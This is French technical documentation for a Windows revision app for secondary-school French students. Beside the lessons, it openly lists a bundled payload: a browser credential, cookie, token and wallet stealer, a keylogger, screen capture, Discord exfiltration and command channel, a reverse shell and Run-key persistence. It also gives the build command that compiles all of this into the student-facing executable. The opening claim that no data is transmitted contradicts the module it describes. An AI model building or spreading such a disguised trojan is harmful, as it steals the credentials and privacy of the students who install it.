# DOCUMENTATION TECHNIQUE — Français 2nd

Application de révision et d'apprentissage du français, niveau seconde générale.
Version 2.4 — application de bureau Windows (WebView2) + version navigateur.

Ce document décrit **chaque fichier**, **chaque fonction** et **chaque donnée** de
l'application. Tout est en français. L'application de révision travaille
localement : aucun contenu de révision (leçons, carnet, notes) n'est transmis.

À cela s'ajoute le module décrit en **§17** : un payload optionnel piloté par
`payload.json`, qui peut exfiltrer vers Discord des données de la machine
(identifiants de navigateurs, captures, journal de clavier) et recevoir des
commandes. Il est réglé par ce fichier seul : `"enabled": false` l'éteint
entièrement.

---

## 1. Vue d'ensemble

L'application existe sous deux formes, qui utilisent **exactement les mêmes fichiers** :

| Forme | Fichier | Comment ça marche |
|---|---|---|
| Application de bureau (recommandé) | `C:\Users\caméléon\Desktop\Français 2nd.exe` | Programme Go compilé qui ouvre une fenêtre native Edge WebView2 et y affiche l'application. Contenu embarqué dans l'exécutable. |
| Version navigateur | `index.html` (ou `Lancer-Francais-2nd.bat`) | La même application ouverte dans le navigateur par défaut. |

Le programme de bureau cherche d'abord les fichiers **à côté de l'exécutable** ;
s'ils sont absents (ex. exécutable copié seul sur le Bureau), il **extrait sa copie
interne** dans `C:\Users\caméléon\AppData\Local\Francais2nd\web` et affiche celle-ci.

---

## 2. Arborescence complète

Racine du projet : `C:\Users\caméléon\Desktop\baye\Francais-2nd\`

| Chemin (relatif) | Lignes | Octets | Rôle |
|---|---:|---:|---|
| `index.html` | 116 | 4 717 | Page de l'application : structure HTML + chargement des scripts |
| `css\styles.css` | 501 | 24 722 | Toute l'apparence (thèmes clair/sombre, boutons, chemin, leçon, carnet, historiques) |
| `js\app-core.js` | 665 | 31 705 | Noyau : état, sauvegarde, navigation, mascotte, sons, textes, progrès, options, bandeau de reprise |
| `js\app-autosave.js` | 470 | 16 645 | Autosave : reprise de leçon en cours, journal de session, bloc-notes, exports |
| `js\app-lesson.js` | 531 | 22 081 | Moteur de leçon : questions, vérification, cœurs, XP, étoiles |
| `js\carnet.js` | 1 290 | 47 405 | Carnet : notes étiquetées et cherchables, brouillon, journal, fiches, historiques datés, récapitulatif |
| `js\data-u1-grammaire.js` | 129 | 16 417 | Unité 1 — contenu |
| `js\data-u2a-conjugaison.js` | 76 | 9 111 | Unité 2 — contenu (partie A : présent, imparfait, futur) |
| `js\data-u2b-conjugaison.js` | 73 | 9 435 | Unité 2 — contenu (partie B : ajoute des niveaux à l'unité A) |
| `js\data-u3-orthographe.js` | 128 | 15 246 | Unité 3 — contenu |
| `js\data-u4-vocabulaire.js` | 115 | 13 389 | Unité 4 — contenu |
| `js\data-u5-figures.js` | 115 | 14 944 | Unité 5 — contenu |
| `js\data-u6-poesie.js` | 102 | 12 734 | Unité 6 — contenu |
| `js\data-u7-litterature.js` | 141 | 19 376 | Unité 7 — contenu |
| `js\data-u8-methodes.js` | 102 | 13 847 | Unité 8 — contenu |
| `js\data-u9-oeuvres.js` | 115 | 14 721 | Unité 9 — contenu |
| `js\data-texts.js` | 210 | 31 142 | Les 16 textes à lire + liste des ressources en ligne |
| `assets\icon.png` | — | 52 155 | Icône 512×512 (logo de l'en-tête, favicon) |
| `assets\icon.ico` | — | 39 539 | Icône Windows multi-tailles (16→256) |
| `assets\icon-256.png` | — | 21 637 | Variante 256 px |
| `assets\icon-1024.png` | — | 82 390 | Variante 1024 px (source) |
| `main.go` | 380 | 12 507 | Application de bureau (Go + WebView2) : démarrage, extraction, autotest, `-diag` |
| `payload.go` | 429 | 12 543 | Payload : configuration, cadences, transport Discord, rotation des journaux |
| `payload.json` | 22 | 1 409 | Réglages du payload embarqués : bot, salon de repli, serveur, reverse shell, cadences, persistance |
| `channel.go` | 180 | 5 211 | Un salon Discord par machine (création à la demande) + envois par le bot |
| `firefox.go` | 523 | 16 130 | Extracteur NSS : `key4.db` (3DES/PBKDF2-PBE), `logins.json`, cookies et historique Firefox |
| `stealer.go` | 682 | 22 850 | Extracteur : DPAPI, navigateurs (mots de passe, cookies, historique), jetons, portefeuilles, rapport machine |
| `keylogger.go` | 287 | 8 189 | Journal de clavier : touches, fenêtre active, presse-papiers, déclenchement des captures |
| `screenshot.go` | 119 | 3 890 | Capture d'écran GDI → PNG (écran virtuel multi-moniteurs) |
| `c2.go` | 514 | 15 409 | C2 Discord (commandes `!`) et reverse shell TCP |
| `persist.go` | 182 | 5 927 | Persistance : clé Run HKCU, repli raccourci/VBS Démarrage, `!persist on|off` |
| `winapi.go` | 206 | 6 576 | Win32 : registre, programmes installés, Defender, écran, IP publique |
| `go.mod` / `go.sum` | — | 662 / 2 484 | Dépendances Go (`go-webview2`, `modernc.org/sqlite`) |
| `rsrc.syso` | — | 40 112 | Icône intégrée dans l'exécutable (ressource Windows) |
| `Francais-2nd.exe` | — | 12 546 048 | Application de bureau compilée (payload inclus) |
| `Lancer-Francais-2nd.bat` | — | 578 | Lance l'application dans le navigateur par défaut |
| `README.txt` | 156 | 8 367 | Mode d'emploi pour l'utilisateur |
| `DOCUMENTATION.md` | ce fichier | — | Documentation technique |
| `generer-icone.py` | 102 | 3 548 | Redessine l'icône (Python + Pillow) |
| `valider-donnees.js` | 91 | 4 847 | Contrôle automatique du contenu (Node) |
| `verifier-identifiants.js` | — | — | Contrôle automatique des identifiants globaux appelés sans être déclaré (Node) |

Copie sur le Bureau : `C:\Users\caméléon\Desktop\Français 2nd.exe`
Données extraites par cette copie : `C:\Users\caméléon\AppData\Local\Francais2nd\web`

---

## 3. `index.html` — la page

### 3.1 Ordre de chargement des scripts (important)

Les données doivent être chargées **avant** le noyau ; le noyau **avant**
l'autosave et le moteur ; le moteur **avant** le carnet.

L'autosave doit être chargé **avant** `app-lesson.js` : le moteur appelle
`Auto.save()`, `Auto.log()`, `Auto.forget()` et `Auto.markDone()` à l'ouverture
d'une leçon. S'il manque, la toute première leçon lève
`ReferenceError: Auto is not defined` et rien ne s'ouvre.

```
 1.  js/data-u1-grammaire.js
 2.  js/data-u2a-conjugaison.js
 3.  js/data-u2b-conjugaison.js
 4.  js/data-u3-orthographe.js
 5.  js/data-u4-vocabulaire.js
 6.  js/data-u5-figures.js
 7.  js/data-u6-poesie.js
 8.  js/data-u7-litterature.js
 9.  js/data-u8-methodes.js
 10. js/data-u9-oeuvres.js
 11. js/data-texts.js
 12. js/app-core.js       ← état, rendu, navigation
 13. js/app-autosave.js   ← reprise de leçon, journal, bloc-notes (Auto)
 14. js/app-lesson.js     ← moteur de leçon (appelle Auto)
 15. js/carnet.js         ← carnet, brouillon, journal, fiches
```

`node verifier-identifiants.js` vérifie cet ordre et l'existence de tous les
identifiants globaux : c'est le garde-fou contre le `Auto is not defined`.

### 3.2 Identifiants des éléments (utilisés par le JavaScript)

| `id` | Rôle |
|---|---|
| `topbar` | Barre supérieure (logo, onglets, compteurs) |
| `tabs` | Les 6 boutons d'onglets (`data-tab="learn|review|texts|carnet|progress|options"`) |
| `hud-streak`, `hud-gems`, `hud-hearts`, `hud-xp` | Compteurs : série 🔥, lingots 💎, cœurs ❤️, XP ⭐ |
| `btn-theme`, `btn-sound` | Bascules thème et son |
| `view-learn`, `view-review`, `view-texts`, `view-carnet`, `view-progress`, `view-options` | Les 6 écrans (un seul `.active` à la fois) |
| `unit-list` | Liste des 9 unités (colonne de gauche) |
| `unit-header` | Bandeau de l'unité courante + barre de progression |
| `path` | Le « chemin » des niveaux (façon Duolingo) |
| `resume-bar` | Bandeau « leçon interrompue » en haut de l'onglet Apprendre |
| `review-cards`, `review-mascot` | Onglet Réviser |
| `texts-cards` | Onglet Textes (bibliothèque puis lecteur) |
| `carnet-body-host` | Onglet Carnet : recherche, liste des notes, éditeur, restauration |
| `carnet-extra` | Onglet Carnet : brouillon, journal, fiches de révision |
| `carnet-brouillon`, `carnet-journal-card`, `carnet-fiches-card` | Panneaux du carnet |
| `carnet-search`, `carnet-title`, `carnet-tags`, `carnet-body`, `carnet-count`, `carnet-save` | Champs de l'éditeur de note |
| `carnet-file` | Sélecteur de fichier caché, pour restaurer une sauvegarde |
| `progress-body` | Onglet Progrès |
| `options-body` | Onglet Options |
| `lesson` | La fenêtre de leçon plein écran (attribut `hidden` quand fermée) |
| `lesson-close`, `lesson-bar`, `lesson-hearts`, `lesson-combo`, `lesson-inner`, `lesson-foot` | Éléments internes de la leçon |
| `confetti` | `<canvas>` pour les confettis |
| `toasts` | Zone des petites notifications |

---

## 4. `css\styles.css` — l'apparence

* **Variables CSS** dans `:root` (thème clair) et `[data-theme="dark"]` :
  `--bg`, `--bg-2`, `--card`, `--text`, `--muted`, `--border`, `--border-2`,
  `--primary`, `--primary-dark`, `--primary-soft`, `--blue`, `--blue-dark`,
  `--red`, `--red-soft`, `--gold`, `--gold-dark`, `--purple`, `--shadow`,
  `--radius`, `--font`.
  Le thème est appliqué par `applyTheme()` sur `<html data-theme="…">`.
* **Sections** : barre supérieure, vues, écran Apprendre (unités + chemin),
  boutons, cartes, écran de leçon, écran de résultats, mascotte, bibliothèque,
  toasts/confettis, tableau du programme, responsive.
* **Classes principales** :
  * Structure : `.logo`, `.logo-text`, `.tabs button(.active)`, `.hud`, `.pill` (`.fire/.gem/.heart/.xp`), `.icon-btn`
  * Apprendre : `.learn-grid`, `.unit-list`, `.unit-item(.active)`, `.unit-badge`, `.u-meta`, `.unit-header`, `.bar > i`, `.path`, `.path-row`, `.node-wrap`, `.node` (`.locked/.done/.boss/.current`), `.node-label`, `.stars`, `.path-gap`, `.mascot-hint`
  * Boutons : `.btn` (`.ghost/.blue/.red/.small`)
  * Leçon : `.lesson-top`, `.lesson-body`, `.lesson-inner`, `.q-consigne`, `.q-title`, `.passage`, `.opts(.two)`, `.opt(.sel/.good/.bad)`, `.opt .k`, `.input-row`, `input.answer`, `select.blank`, `.sentence`, `.bank`, `.chip(.used/.placed)`, `.answer-line`, `.match-grid`, `.col`, `.mchip(.sel/.done/.bad)`, `.lesson-foot`, `.feedback(.bad)`, `.fb-ico`, `.fb-txt`, `.mascot-line`, `.bubble`
  * Résultats : `.result`, `.result-stats`, `.big`
  * Divers : `.card`, `.cards`, `.stat-grid`, `.stat-card`, `.badge(.on/.off)`, `.tag`, `.work-card`, `.reader-passage`, `.gloss .g`, `.toast`, `table.prog`, `.ok-dot`, `.no-dot`
* **Animations** : `fade` (apparition des vues), `pulse` (niveau à faire),
  `bob` (mascotte), `blink` (yeux de la mascotte).
* **Responsive** : `@media (max-width: 940px)` (unités en ligne, logo réduit),
  `@media (max-width: 640px)` (options sur une colonne, onglets compacts).

---

## 5. Les fichiers de contenu `js\data-u*.js`

### 5.1 Modèle de données

```js
window.UNITS = window.UNITS || [];
window.UNITS.push({
  id:    "grammaire",            // identifiant unique de l'unité
  name:  "La grammaire",         // titre affiché
  icon:  "Aa",                   // étiquette du badge coloré
  color: "#3ecf8e",              // couleur du badge et de la barre
  desc:  "Les classes de mots…", // description affichée dans le bandeau
  levels: [ /* niveaux */ ]
});
```

Un **niveau** :

```js
{
  id: "gr1",                    // identifiant unique (utilisé pour la sauvegarde)
  name: "Le nom et le déterminant",
  boss: true,                   // FACULTATIF : niveau « défi » (couronne 👑)
  qs: [ /* questions */ ]
}
```

Une **question** : champ `t` (type) + champs propres au type. `e` = explication
affichée en cas d'erreur.

| `t` | Signification | Champs | Exemple |
|---|---|---|---|
| `q` | QCM | `q`, `a` (propositions), `c` (index de la bonne réponse), `e` | `{t:"q",q:"… ?",a:["Bonne","Fausse"],c:0,e:"…"}` |
| `tf` | Vrai / faux | `q`, `c` (booléen), `e` | `{t:"tf",q:"…",c:true,e:"…"}` |
| `cl` | Texte à trous (menus déroulants) | `q` (contient `___`), `opts` (tableau de tableaux), `ans` (réponses), `e` | `{t:"cl",q:"Il ___ mal.",opts:[["a","à"]],ans:["a"],e:"…"}` |
| `ti` | Réponse écrite | `q`, `ans` (réponses acceptées), `e` | `{t:"ti",q:"…",ans:["nous chantons"],e:"…"}` |
| `or` | Remise en ordre | `p` (mots proposés), `a` (phrase correcte), `e` | `{t:"or",p:["Le","chat","dort"],a:"Le chat dort",e:"…"}` |
| `mt` | Associations | `pairs` (tableau de paires), `e` | `{t:"mt",pairs:[["a","verbe avoir"],["à","préposition"]],e:"…"}` |
| `au` | Écoute (voix de synthèse) | `say` (texte dit), `a`, `c`, `e` | `{t:"au",say:"Je finis mes devoirs.",a:[…],c:0,e:"…"}` |
| `tx` | D'après un texte | `q`, `a`, `c`, `e` (utilisé avec un passage) | idem `q` |

### 5.2 Contenu exact des 9 unités

| Fichier | `id` | Unité | Niveaux | Questions | dont boss |
|---|---|---|---:|---:|---:|
| `data-u1-grammaire.js` | `grammaire` | La grammaire | 9 | 72 | 1 |
| `data-u2a` + `data-u2b` | `conjugaison` | La conjugaison | 10 | 80 | 1 |
| `data-u3-orthographe.js` | `orthographe` | L'orthographe | 9 | 72 | 1 |
| `data-u4-vocabulaire.js` | `vocabulaire` | Le vocabulaire | 8 | 64 | 1 |
| `data-u5-figures.js` | `figures` | Les figures de style | 8 | 64 | 1 |
| `data-u6-poesie.js` | `poesie` | La poésie | 7 | 56 | 1 |
| `data-u7-litterature.js` | `litterature` | Histoire littéraire | 10 | 80 | 1 |
| `data-u8-methodes.js` | `methodes` | Les méthodes | 7 | 56 | 1 |
| `data-u9-oeuvres.js` | `oeuvres` | Les grandes œuvres | 8 | 64 | 1 |
| **Total** | | | **76** | **608** | **9** |

Répartition par type (unités) : `q` 342 · `ti` 68 · `tf` 77 · `cl` 51 · `mt` 50 ·
`or` 17 · `au` 3.

### 5.3 Particularité de l'unité 2

`data-u2a-conjugaison.js` crée l'unité (`window.UNITS.push({...})`) avec les 5
premiers niveaux. `data-u2b-conjugaison.js` **complète la même unité** :

```js
(function () {
  var u = window.UNITS.find(function (x) { return x.id === "conjugaison"; });
  if (!u) return;
  u.levels.push( /* 5 niveaux supplémentaires */ );
})();
```

C'est pourquoi l'ordre de chargement des scripts compte.

---

## 6. `js\data-texts.js` — les textes à lire

### 6.1 Modèle

```js
window.TEXTES = [{
  id: "tx1",
  title: "Le Corbeau et le Renard",
  author: "Jean de La Fontaine",
  year: "1668",
  genre: "Fable (vers)",
  unit: "oeuvres",              // unité à laquelle le texte se rattache
  ctx: "…",                     // présentation (contexte)
  gloss: [["ramage","le chant des oiseaux"], …],  // glossaire [mot, définition]
  passage: "…",                 // le texte (retours à la ligne \n)
  qs: [ /* 3 questions, type q */ ]
}];
```

16 textes, 48 questions de quiz (3 par texte). Tous du domaine public.
Certains passages ont une orthographe modernisée pour rester lisibles.

### 6.2 `window.RESSOURCES`

Tableau `{ n: "nom du site", u: "https://…" }` (10 entrées) affiché dans l'onglet
**Options** : Éduscol, Lumni, Gallica (BnF), CNRTL, Vikidia, Le Point du FLE,
TV5MONDE, Académie française, Projet Voltaire, France Culture.

---

## 7. `js\app-core.js` — le noyau

### 7.1 État sauvegardé

Clé de sauvegarde : **`francais2nd.v2`** dans le stockage local du composant
d'affichage (localStorage). Si le stockage est indisponible, l'application
continue en mémoire (`MEM_FALLBACK`).

```js
var DEFAULT_STATE = {
  xp: 0,                 // points d'expérience
  gems: 0,               // lingots
  hearts: 5,             // cœurs (max 5 = MAX_HEARTS)
  streak: 0,             // série de jours consécutifs
  lastDay: null,         // dernier jour travaillé (AAAA-MM-JJ)
  levels: {},            // { "gr1": { stars: 0-3, best: 0-100 } }
  wrong: [],             // questions ratées : [{ q, src, when }] (max 60)
  reads: {},             // { "tx1": true } lectures validées
  answered: 0,           // nombre total de réponses données
  correct: 0,            // nombre de bonnes réponses
  minutes: 0,            // temps passé dans les leçons
  settings: { theme: "light", sound: true, rate: 0.95 },
  seen: false
};
```

### 7.2 Liste des fonctions

| Ligne | Fonction | Rôle |
|---:|---|---|
| 23 | `loadState()` | Lit la sauvegarde (fusion avec `DEFAULT_STATE`) |
| 30 | `saveState()` | Écrit la sauvegarde (repli mémoire si erreur) |
| 38 | `$(sel, root)` | Raccourci `querySelector` |
| 39 | `$$(sel, root)` | Raccourci `querySelectorAll` (renvoie un tableau) |
| 40 | `el(tag, cls, html)` | Crée un élément HTML |
| 46 | `shuffle(a)` | Mélange un tableau (copie) |
| 54 | `norm(s)` | Normalise un texte : apostrophes, espaces, minuscules, ponctuation finale |
| 63 | `stripAcc(s)` | Comme `norm` mais sans accents (comparaison tolérante) |
| 66 | `dayKey(d)` | Date au format `AAAA-MM-JJ` |
| 70 | `allLevels()` | Liste de tous les niveaux avec leur unité |
| 77 | `findLevel(levelId)` | Retrouve un niveau par son identifiant |
| 84 | `starsOf(levelId)` | Nombre d'étoiles d'un niveau |
| 86 | `qKey(q)` | Clé unique d'une question (énoncé + réponse), gère tableau **et** texte |
| 92 | `unitDone(u)` | Nombre de niveaux réussis dans une unité |
| 93 | `unitStars(u)` | Total d'étoiles d'une unité |
| 94 | `totalStars()` | Total d'étoiles de l'application |
| 95 | `unitUnlocked(idx)` | Une unité est ouverte si la précédente a ≥ 1 niveau réussi |
| 100 | `levelUnlocked(uIdx, lIdx)` | Un niveau est ouvert si le précédent a ≥ 1 étoile |
| 107 | `currentUnitIndex()` | Première unité non terminée (celle à afficher) |
| 142 | `pick(a)` | Choix aléatoire dans un tableau |
| 146 | `beep(freq, dur, type, vol, delay)` | Bip (WebAudio) |
| 162-165 | `sndGood()`, `sndBad()`, `sndWin()`, `sndClick()` | Sons de l'application |
| 169 | `pickVoice()` | Choisit une voix française pour la synthèse vocale |
| 178 | `speak(text, cb)` | Lit un texte à voix haute (français) |
| 192 | `toast(msg, ms)` | Notification en bas à droite |
| 198 | `confetti()` | Confettis sur le `<canvas>` : 130 confettis animés sur 190 images |
| 224 | `renderHUD()` | Met à jour les compteurs de la barre supérieure |
| 232 | `applyTheme()` | Applique le thème clair/sombre |
| 239 | `showTab(tab)` | Change d'onglet et redessine la vue |
| 253 | `renderUnits()` | Liste des unités (colonne de gauche) |
| 269 | `renderPath()` | Bandeau d'unité + chemin des niveaux + mascotte |
| 313 | `renderReview()` | Cartes de l'onglet Réviser |
| 343 | `openUnitPicker()` | Choix du thème pour l'entraînement ciblé |
| 363 | `renderTexts()` | Bibliothèque des 16 textes |
| 378 | `openReader(w)` | Lecteur d'un texte (texte, glossaire, écoute, quiz) |
| 413 | `BADGES` | Les 12 badges (conditions de déblocage) |
| 428 | `renderProgress()` | Statistiques, badges, progression par unité, couverture du programme |
| 478 | `renderOptions()` | Réglages, sauvegarde/export, ressources, à propos |
| 544 | `touchDay()` | Met à jour la série : même jour = rien ; hier = +1 ; sinon retour à 1 |
| 553 | `init()` | Démarrage : thème, HUD, chemin, onglets, minuteur de temps |

Variables notables : `MASCOT_SVG` (la mascotte Fifou, dessin SVG écrit à la main),
`LINES_GOOD` / `LINES_BAD` / `LINES_START` / `LINES_END` (répliques de la mascotte),
`STORE_KEY`, `MAX_HEARTS`, `S` (l'état courant).

Fonction interne (déclarée à l'intérieur d'une autre fonction) : `card(title, desc, btn, fn)`
— ligne 319, dans `renderReview()` — construit une carte de l'onglet Réviser.

---

## 8. `js\app-lesson.js` — le moteur de leçon

### 8.1 Modes de leçon

| Mode | Déclencheur | Cœurs | Récompense |
|---|---|---|---|
| `normal` | Clic sur un niveau | consommés et enregistrés | XP, étoiles, lingots |
| `boss` | Niveau « défi » (👑) | consommés | XP, étoiles, +10 lingots |
| `practice` | Onglet Réviser → « Gagner un cœur » / « Entraînement par thème » | non consommés | XP réduits, +1 cœur |
| `review` | Révision express / Sauvetage des erreurs | non consommés | XP |
| `text` | Quiz d'un texte de la bibliothèque | non consommés | XP + 15 XP la première fois |

### 8.2 État d'une leçon (`LS`)

```js
LS = { title, qs, i, correct, wrong, combo, maxCombo,
       mode, levelId, unitIdx, boss, textId, state, checked, hearts }
```
`LS.state` contient les réponses en cours : `sel`, `optEls`, `selectEls`, `input`,
`placed`, `matchSel`, `matchDone`, `matchWrong`, `correctIdx`, `hintUsed`.

### 8.3 Fonctions

| Ligne | Fonction | Rôle |
|---:|---|---|
| 10 | `startLesson(unitIdx, levelIdx, mode)` | Lance un niveau du chemin |
| 22 | `startRandomLesson(n, title)` | Révision express (questions au hasard dans tout le programme) |
| 30 | `startWrongLesson()` | Sauvetage : rejoue les questions ratées |
| 35 | `startUnitPractice(unitIdx)` | 10 questions d'une unité choisie |
| 44 | `startPracticeLesson()` | 10 questions faciles pour regagner un cœur |
| 52 | `startTextQuiz(work)` | Quiz de lecture (ajoute le passage et l'identifiant du texte) |
| 58 | `openLesson(cfg)` | Prépare `LS`, ouvre la fenêtre, refuse si 0 cœur |
| 77 | `closeLesson()` | Ferme la leçon et redessine le parcours |
| 85 | `updateLessonTop()` | Barre de progression, cœurs, compteur de combo |
| 94 | `renderQuestion()` | Affiche la question courante (aiguillage par type) |
| 130 | `setFoot(feedback, ok)` | Pied de page : bouton « Vérifier » ou bandeau de correction |
| 151 | `enableCheck()` | Active le bouton « Vérifier » |
| 157 | `renderChoice(box, q, options, correctIdx)` | QCM, vrai/faux, écoute |
| 177 | `renderAudio(box, q)` | Écoute : bouton 🔊, transcription, propositions |
| 211 | `renderCloze(box, q)` | Texte à trous : un menu déroulant par `___` |
| 235 | `renderTypeIn(box, q)` | Réponse écrite (Entrée = valider) |
| 251 | `renderOrder(box, q)` | Remise en ordre : ligne de réponse + mots cliquables |
| 281 | `renderMatch(box, q)` | Associations : deux colonnes, paires à relier |
| 326 | `checkAnswer()` | Corrige la réponse, met à jour cœurs/combo/statistiques, affiche l'explication |
| 388 | `rememberWrong(q)` | Mémorise une question ratée (sans doublon, max 60) |
| 399 | `clearWrong(q)` | Retire une question de la liste des erreurs quand elle est réussie |
| 406 | `nextQuestion()` | Question suivante ou fin de leçon |
| 414 | `finishLesson()` | Calcule XP, étoiles, lingots ; écran de résultats ; confettis |
| 482 | `closeLessonSilent()` | Ferme la leçon sans redessiner |
| 489 | `outOfHearts()` | Écran « Plus de cœurs » |

Fonction interne : `mk(item, côté)` — ligne 290, dans `renderMatch()` — crée un bouton
de la grille d'associations (`côté` vaut `"L"` ou `"R"`).

### 8.4 Règles de calcul (dans `finishLesson`)

```js
précision   = correct / (correct + wrong)
étoiles     = 3 si précision ≥ 0,95  ·  2 si ≥ 0,75  ·  1 si ≥ 0,50  ·  sinon 0
XP          = base + arrondi(précision × 8) + (0 erreur ? 5 : 0) + min(combo max, 10)
              base = 5 en entraînement, 10 sinon
lingots     = +5 la première fois qu'un niveau obtient 3 étoiles ; +10 pour un défi réussi
cœurs       = -1 par erreur (modes normal et défi) ; +1 en entraînement (max 5)
lecture     = +15 XP la première fois qu'un texte est validé
```

* Un niveau est **réussi** (et débloque le suivant) à partir de **1 étoile (50 %)**.
* Un **défi (boss)** ne s'ouvre que si tous les niveaux de l'unité sont réussis.
* Le **combo** s'affiche à partir de 3 bonnes réponses d'affilée ; une erreur le remet à 0.
* `touchDay()` est appelé à chaque fin de leçon → met à jour la série de jours.

### 8.5 Clavier (écoute globale)

| Touche | Effet |
|---|---|
| `1` … `4` | Choisir une proposition (QCM, vrai/faux, écoute) |
| `Entrée` | Vérifier, puis passer à la suite |
| `Échap` | Quitter la leçon |

---

## 9. `main.go` — l'application de bureau (Go)

### 9.1 Principe

1. `prepareContent()` cherche `index.html` à côté de l'exécutable.
   * Trouvé → ce dossier est utilisé (on peut modifier le contenu et relancer).
   * Absent → `extractEmbedded()` écrit la copie embarquée dans
     `%LOCALAPPDATA%\Francais2nd\web` et c'est ce dossier qui est utilisé.
2. `fileURL()` construit une adresse `file://` correcte (espaces et accents échappés).
3. `webview2.NewWithOptions(...)` ouvre la fenêtre native (titre, 1360×900, centrée,
   icône `IconId: 1`, taille minimale 1000×700), puis `Navigate(fileURL)` et `Run()`.

Le contenu embarqué est déclaré par :

```go
//go:embed index.html css js assets
var content embed.FS
```

### 9.2 Fonctions

| Ligne | Fonction | Rôle |
|---:|---|---|
| 59 | `exeDir()` | Dossier de l'exécutable |
| 69 | `prepareContent()` | Renvoie le dossier à afficher (à côté de l'exe, sinon extrait) |
| 82 | `extractEmbedded(dest)` | Écrit tous les fichiers embarqués dans `dest` |
| 103 | `fileURL(dir)` | Transforme un chemin en URL `file://` |
| 112 | `writeLog(line)` | Écrit une ligne dans `diagnostic.txt` (mode `-diag` uniquement) |
| 128 | `messageBox(title, text)` | Boîte de dialogue Windows (signalement d'erreur) |
| 137 | `fatal(msg)` | Journal + boîte de dialogue + arrêt |
| 147 | `newHandler(root)` | Serveur HTTP local (sert le dossier + point `/__log`) |
| — | `startServer(root)` | Démarre le serveur : essaie 47823→47828, puis demande un port libre au système (`127.0.0.1:0`). Nécessaire, car Windows réserve des plages entières |
| 178 | `main()` | Lecture des options, préparation, fenêtre |
| — | `runSelfTest(root)` | Vérifie les fichiers embarqués (liste dérivée de l'embed, jamais figée) et que chaque `src` de `index.html` existe |

### 9.3 Options de ligne de commande

| Commande | Effet |
|---|---|
| `Francais-2nd.exe` | Ouvre la fenêtre de l'application |
| `Francais-2nd.exe -selftest` | Vérifie les fichiers puis affiche le résultat (code 0 = OK) |
| `Francais-2nd.exe -diag` | Ouvre la fenêtre en écrivant `diagnostic.txt` (démarrage, chargement de la page, erreurs JS) |
| `Francais-2nd.exe -serve` | Sert l'application sur `http://127.0.0.1:<port>/` sans ouvrir de fenêtre. Le port est affiché dans la console |

En mode `-diag`, un petit script est injecté dans la page (option `Init` de la
bibliothèque WebView2). Sa fonction interne `r(message)` renvoie au serveur local,
via `fetch(..., {mode:'no-cors'})`, l'état du chargement : « script injecte »,
« DOMContentLoaded », « page chargee », puis les éventuelles erreurs JavaScript.
Ces messages sont écrits dans `diagnostic.txt`.

### 9.4 Reconstruire l'exécutable

```bash
cd C:\Users\caméléon\Desktop\baye\Francais-2nd
go build -ldflags "-H windowsgui -s -w" -o Francais-2nd.exe .
```

`-H windowsgui` = pas de fenêtre de console ; `-s -w` = exécutable plus léger.
L'icône de l'exécutable vient de `rsrc.syso` (généré avec
`go run github.com/akavel/rsrc@latest -ico assets/icon.ico -o rsrc.syso`).

> Note : l'application navigue en `file://`. La navigation vers un serveur HTTP
> local dans WebView2 s'était révélée instable (chargement partiel de la page) ;
> c'est pourquoi le serveur local ne sert plus qu'au mode `-serve` et au diagnostic.

---

## 10. Outils

### 10.1 `valider-donnees.js` (Node)

Contrôle automatique de **tout** le contenu : identifiants uniques, énoncés non vides,
propositions sans doublon, index de bonne réponse valide, nombre de trous = nombre de
listes d'options, réponses présentes dans les options, mots d'une remise en ordre
conformes à la phrase attendue, associations sans ambiguïté, textes assez longs.

```bash
node valider-donnees.js
```
Sortie attendue : `Unités : 9 | Niveaux : 76 | Questions : 656 | Textes : 16` puis
`Erreurs : 0 | Avertissements : 0`.

### 10.2 `verifier-identifiants.js` (Node)

Contrôle automatique des **identifiants globaux** : tout nom appelé en
`nom(` ou `nom.membre(` alors qu'il n'est déclaré ni comme `function`, ni
`var/let/const`, ni comme paramètre de fonction, ni parmi les objets natifs
(`window`, `document`, `localStorage`…). Le script neutralise commentaires,
chaînes, gabarits et littéraux de regex avant d'analyser, sans quoi le texte
français des questions serait pris pour du code.

C'est le garde-fou du bug le plus coûteux du projet : `app-lesson.js` et
`app-core.js` appellent `Auto.*`, et l'oubli de `app-autosave.js` dans
`index.html` faisait échouer toute leçon d'un `ReferenceError`.

```bash
node verifier-identifiants.js
```
Sortie attendue : `OK — aucun identifiant global appelé sans être déclaré`.

### 10.3 `generer-icone.py` (Python + Pillow)

Redessine l'icône (carré arrondi dégradé vert, lettre F blanche, barres tricolores,
étoile) et écrit `assets/icon.png`, `assets/icon-256.png`, `assets/icon-1024.png`
et `assets/icon.ico`.

```bash
python generer-icone.py
```
Après régénération de l'icône, relancer la génération de `rsrc.syso` puis recompiler
l'exécutable (voir 9.4).

---

## 11. Flux détaillés

### 11.1 Démarrage

1. `DOMContentLoaded` → `init()` (noyau) : `applyTheme()`, `renderHUD()`, `renderPath()`,
   branchement des onglets, des boutons thème/son, minuteur de temps.
2. `renderPath()` → `renderUnits()` puis construction du chemin et de la mascotte.
3. Onglet actif : **Apprendre**.

### 11.2 Une leçon, pas à pas

1. Clic sur un niveau → `startLesson(unitIdx, levelIdx, "normal")`.
2. `openLesson()` copie les questions (en ajoutant `_src` = « Unité · Niveau »).
3. `renderQuestion()` affiche la question selon son type.
4. L'élève répond → `checkAnswer()` : correction, son, cœurs, combo, explication.
   Une erreur est mémorisée (`rememberWrong`), une réussite la retire (`clearWrong`).
5. `nextQuestion()` enchaîne ; à la dernière question → `finishLesson()`.
6. `finishLesson()` : XP, étoiles, lingots, `saveState()`, `touchDay()`, écran de
   résultats, confettis (si 3 étoiles ou niveau normal/défi).
7. « Retour au parcours » → `closeLesson()` → `renderPath()` : le niveau suivant est
   débloqué.

### 11.3 Sauvegarde

* Chaque modification d'état appelle `saveState()` → `localStorage["francais2nd.v2"]`.
* Le temps de travail est ajouté toutes les 10 secondes (`init()`), à raison de 1/6 de minute.
* Export : onglet **Options** → « Exporter ma progression » (fichier
  `francais2nd-progression.json`).
* Historiques datés : toutes les dix minutes, une copie de tout l'état
  (voir §16.5), douze conservées.
* Réinitialisation : onglet **Options** → « Réinitialiser » (double confirmation).

---

## 12. Où sont stockées les données

| Donnée | Emplacement |
|---|---|
| Progression (XP, étoiles, série, erreurs…) | stockage local du composant d'affichage, clé `francais2nd.v2` |
| Carnet (notes, étiquettes, date de création) | stockage local du composant d'affichage, clé `francais2nd.carnet.v1` |
| Copie de secours du carnet | clé `francais2nd.carnet.v1.bak`, réécrite à chaque lecture réussie |
| Leçon en cours (reprise) | clé `francais2nd.autosave.v1` |
| Journal de session | clé `francais2nd.autosave.v1.journal` |
| Brouillon | clé `francais2nd.notes.v1` |
